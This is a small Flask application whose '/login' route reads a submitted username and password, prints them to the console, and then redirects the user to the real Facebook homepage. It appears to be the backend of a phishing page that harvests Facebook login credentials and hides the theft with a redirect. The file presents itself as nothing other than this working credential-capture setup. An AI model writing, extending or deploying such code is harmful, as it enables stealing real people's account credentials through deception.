from flask import Flask, render_template, redirect, request
import requests




app = Flask(__name__)


# home route 
@app.route('/')
def index():
    
    return render_template('index.html')
    

# user hit login button
''' Create a route that takes both GET and POST methods
and render the info in the input to desire destination '''

@app.route('/login', methods = ['POST', 'GET'] )
def login():

    # git user credential from form only if they enter something
    userName = request.form.get("emailUsername")
    password = request.form.get("password")
  
    #Form Validation will be done in front end in the html.
    print(userName)
    print(password)
            

    
    ''' If user info is sucessfully passon to this route
        take them to the official facebook page '''


    return redirect('https://www.facebook.com/?stype=lo&jlou=AfeYCZSjoD8RTkU3MoAZ3Zzk5O6_0KBFaxHzBtgy8POvS64NNnPr6s4Lh040YN6f3EdvIxy-f2yf0dFkvw5bjKutIukOdXlipcRz7AVXK6b_EA&smuh=5272&lh=Ac_GsPJ4Lh-aUNQt')

@app.route('/test')
def test():
    pass


    






# main module page 
if __name__ == "__main__":
    app.run(debug=True)
